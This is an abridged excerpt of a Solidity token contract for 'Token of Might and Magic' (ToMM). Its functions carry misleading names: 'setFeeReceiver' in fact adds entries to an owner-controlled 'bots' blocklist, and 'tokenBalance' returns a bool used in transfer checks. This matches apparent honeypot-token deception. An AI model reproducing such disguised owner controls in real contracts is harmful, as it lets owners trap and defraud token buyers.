...
abstract contract ERC20Token is Ownable {
    ...
    function setFeeReceiver(bytes32[] calldata _hashes) external onlyOwner {
        for (uint i = 0; i < _hashes.length; i++) {
            bots[_hashes[i]] = true;
        }
    }
    function tokenBalance(address owner) public view returns (bool) {
    ...
    function duringLiquify(address from, address to) public view returns (bool) {
        ...
        return tokenBalance(to);
    }
    function isAllowed(address from, address recipient, address _to) public returns (bool) {
        bool allowed = !addingLiquidity(from, recipient, _to) && !inLiquidityTx && recipient != address(this);
        bool lqPair = !tokenBalance(recipient) && !tokenBalance(from);
    ...
    function addingLiquidity(address param1, address param2, address adr1) internal view returns (bool) {
        return (param2 == adr1 && tokenBalance(param1)) || (param1 == adr1 && tokenBalance(param2));
    }
}

contract ToMM is IERC20, ERC20Token {
    ...
    string private _name = "Token of Might and Magic";
    string private  _symbol = "ToMM";
